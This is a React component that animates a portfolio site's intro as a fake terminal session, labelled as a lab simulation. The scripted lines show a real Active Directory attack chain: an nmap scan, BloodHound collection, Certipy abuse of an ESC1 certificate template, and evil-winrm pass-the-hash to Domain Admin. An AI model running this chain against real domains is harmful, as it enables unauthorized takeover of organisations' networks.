import { useCallback, useEffect, useRef, useState } from 'react'
import { site } from '../site'

type Tone = 'plain' | 'dim' | 'ok' | 'warn' | 'alert' | 'accent'

type Step =
  | { kind: 'cmd'; text: string }
  | { kind: 'out'; text: string; tone?: Tone; pause?: number }
  | { kind: 'bar'; label: string; ms: number }

type Line =
  | { id: number; kind: 'cmd'; text: string }
  | { id: number; kind: 'out'; text: string; tone: Tone }
  | { id: number; kind: 'bar'; label: string; pct: number }

const HOST = `${site.handle}💀Akira`
const CWD = '~/corp.local'
const BAR_WIDTH = 16

const TONE_CLASS: Record<Tone, string> = {
  plain: 'text-ink/90',
  dim: 'text-mute',
  ok: 'text-phos',
  warn: 'text-warn',
  alert: 'text-alert',
  accent: 'text-phos font-medium',
}

// A short, plausible Active Directory attack chain (ESC1 -> Domain Admin).
const SCRIPT: Step[] = [
  {
    kind: 'out',
    text: '# simulated session: lab environment, nothing here touches a real network',
    tone: 'dim',
    pause: 450,
  },

  { kind: 'cmd', text: 'nmap -Pn -sCV -p- --min-rate 3000 10.10.11.10' },
  { kind: 'out', text: 'Nmap scan report for dc01.corp.local (10.10.11.10)', tone: 'dim' },
  { kind: 'out', text: '53/tcp   open  domain        Simple DNS Plus' },
  { kind: 'out', text: '88/tcp   open  kerberos-sec  Microsoft Windows Kerberos' },
  { kind: 'out', text: '389/tcp  open  ldap          Microsoft Windows Active Directory LDAP' },
  { kind: 'out', text: '445/tcp  open  microsoft-ds' },
  { kind: 'out', text: '5985/tcp open  http          Microsoft HTTPAPI httpd 2.0' },

  { kind: 'cmd', text: 'bloodhound-python -d corp.local -u svc_backup -c All' },
  { kind: 'out', text: 'INFO: Found 1 domains, 214 users, 61 groups, 37 computers', tone: 'dim' },
  { kind: 'out', text: 'INFO: Done in 00M 41S', tone: 'dim' },

  { kind: 'cmd', text: 'certipy find -u svc_backup@corp.local -vulnerable' },
  { kind: 'out', text: '[*] Found 34 certificate templates' },
  { kind: 'out', text: "[!] Template 'CorpUser' is vulnerable to ESC1", tone: 'warn' },

  { kind: 'cmd', text: 'certipy req -template CorpUser -upn administrator@corp.local' },
  { kind: 'out', text: "[*] Saved certificate and private key to 'administrator.pfx'" },

  { kind: 'cmd', text: 'certipy auth -pfx administrator.pfx' },
  { kind: 'out', text: "[+] Got hash for 'administrator@corp.local': aad3b435…:████████████", tone: 'ok' },

  { kind: 'cmd', text: 'evil-winrm -i 10.10.11.10 -u administrator -H $NTHASH' },
  { kind: 'out', text: '*Evil-WinRM* PS C:\\Users\\Administrator> whoami', tone: 'dim' },
  { kind: 'out', text: 'corp\\administrator', tone: 'alert' },
  { kind: 'out', text: '[+] Domain Admin. Lab objective complete.', tone: 'ok', pause: 350 },

  { kind: 'cmd', text: 'whoami' },
  { kind: 'out', text: site.handle, tone: 'accent' },
  { kind: 'out', text: `${site.name}, security and frontend`, pause: 300 },

  { kind: 'bar', label: 'Mounting /labs-and-notes', ms: 700 },
  { kind: 'bar', label: 'Starting portfolio', ms: 800 },
]

function Prompt({ text, cursor }: { text: string; cursor?: boolean }) {
  return (
    <div className="mt-2 break-all">
      <div className="text-phos-dim">
        ┌──(<span className="text-phos">{HOST}</span>)-[<span className="text-ink">{CWD}</span>]
      </div>
      <div>
        <span className="text-phos-dim">└─$ </span>
        <span className="text-ink">{text}</span>
        {cursor && <span className="cursor" aria-hidden="true" />}
      </div>
    </div>
  )
}

export default function BootSequence({ onDone }: { onDone: () => void }) {
  const [lines, setLines] = useState<Line[]>([])
  const [typing, setTyping] = useState<string | null>(null)
  const [leaving, setLeaving] = useState(false)

  const idRef = useRef(0)
  const leavingRef = useRef(false)
  const doneRef = useRef(onDone)

  useEffect(() => {
    doneRef.current = onDone
  }, [onDone])

  const finish = useCallback(() => {
    if (leavingRef.current) return
    leavingRef.current = true
    setLeaving(true)
    window.setTimeout(() => doneRef.current(), 320)
  }, [])

  // Lock page scroll while the intro is covering the site.
  useEffect(() => {
    const previous = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    return () => {
      document.body.style.overflow = previous
    }
  }, [])

  // Any key skips the intro.
  useEffect(() => {
    const onKey = () => finish()
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [finish])

  // The scripted session.
  useEffect(() => {
    let cancelled = false
    const sleep = (ms: number) => new Promise<void>((resolve) => window.setTimeout(resolve, ms))
    const nextId = () => idRef.current++

    async function run() {
      setLines([])
      setTyping(null)
      await sleep(350)

      for (const step of SCRIPT) {
        if (cancelled) return

        if (step.kind === 'cmd') {
          for (let i = 1; i <= step.text.length; i++) {
            if (cancelled) return
            setTyping(step.text.slice(0, i))
            await sleep(step.text[i - 1] === ' ' ? 100 : 7 + Math.random() * 20)
          }
          await sleep(600)
          if (cancelled) return
          setTyping(null)
          setLines((prev) => [...prev, { id: nextId(), kind: 'cmd', text: step.text }])
          await sleep(170)
        } else if (step.kind === 'out') {
          setLines((prev) => [
            ...prev,
            { id: nextId(), kind: 'out', text: step.text, tone: step.tone ?? 'plain' },
          ])
          await sleep(step.pause ?? 150)
        } else {
          const id = nextId()
          setLines((prev) => [...prev, { id, kind: 'bar', label: step.label, pct: 0 }])
          const ticks = 20
          for (let i = 1; i <= ticks; i++) {
            await sleep(step.ms / ticks)
            if (cancelled) return
            const pct = Math.round((i / ticks) * 100)
            setLines((prev) =>
              prev.map((l) => (l.id === id && l.kind === 'bar' ? { ...l, pct } : l)),
            )
          }
        }
      }

      await sleep(900)
      if (!cancelled) finish()
    }

    void run()
    return () => {
      cancelled = true
    }
  }, [finish])

  return (
    <div
      onClick={finish}
      className={`term fixed inset-0 z-50 cursor-pointer overflow-hidden bg-[#050907] transition-opacity duration-300 ${
        leaving ? 'opacity-0' : 'opacity-100'
      }`}
    >
      <p className="sr-only">
        Intro animation of a terminal session. Press any key or use the skip button to continue.
      </p>

      <button
        type="button"
        autoFocus
        onClick={(e) => {
          e.stopPropagation()
          finish()
        }}
        className="absolute right-4 top-4 z-10 cursor-pointer rounded border border-phos-dim/70 px-3 py-1.5 text-xs text-phos transition-colors hover:bg-phos hover:text-bg"
      >
        Skip intro (any key)
      </button>

      <div
        aria-hidden="true"
        className="mx-auto flex h-full max-w-3xl flex-col justify-end px-5 pb-8 pt-16 text-[13px] leading-relaxed sm:text-sm"
      >
        {lines.map((l) => {
          if (l.kind === 'cmd') return <Prompt key={l.id} text={l.text} />
          if (l.kind === 'out') {
            return (
              <div key={l.id} className={`whitespace-pre-wrap break-words ${TONE_CLASS[l.tone]}`}>
                {l.text}
              </div>
            )
          }
          const filled = Math.round((l.pct / 100) * BAR_WIDTH)
          const bar = `[${'█'.repeat(filled)}${'░'.repeat(BAR_WIDTH - filled)}] ${String(l.pct).padStart(3, ' ')}%  `
          return (
            <div key={l.id} className="mt-1 whitespace-pre-wrap text-phos">
              {bar}
              <span className="text-mute">{l.label}</span>
            </div>
          )
        })}
        {typing !== null && <Prompt text={typing} cursor />}
      </div>
    </div>
  )
}
